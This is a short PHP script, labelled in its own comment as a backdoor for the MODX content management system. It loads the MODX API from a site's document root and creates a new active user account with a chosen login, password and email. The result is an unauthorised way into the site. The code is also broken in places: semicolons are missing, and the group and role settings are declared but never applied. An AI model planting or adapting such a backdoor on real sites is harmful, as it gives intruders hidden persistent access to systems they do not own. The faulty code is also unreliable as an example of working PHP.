<?php

/**
 * It`s backdoor in ModX
 */

 $username = '';    // Login
 $password = '';    // Password
 $email = '';       // Email

 $usergroup = 1;
 $user_role = 2;

 $part_to_docroot = '';


 if (empty($username) || empty($password) || empty($email)) {
     print 'ERROR: Missing criteria.';
     exit;
 }

 define('MODX_API_MODE', true);

 require_once($part_to_docroot.'index.php');

 $modx = new modX();
 $modx->initialize('mgr');

 $user = $modx->newObject('modUser');
 $profile = $modx->newObject('modUserProfile');

 $user->set('username', $username);
 $user->set('active', 1);
 $user->set('password', $password);

 $profile->set('email', $email);
 $profile->set('internalKey', 0);
 $user->addOne($profile, 'Profile');

 if (!$user->save()) {
     print 'ERROR: Could not add User to User Group'
     exit;
 }

 print "SUCCES: User $username added."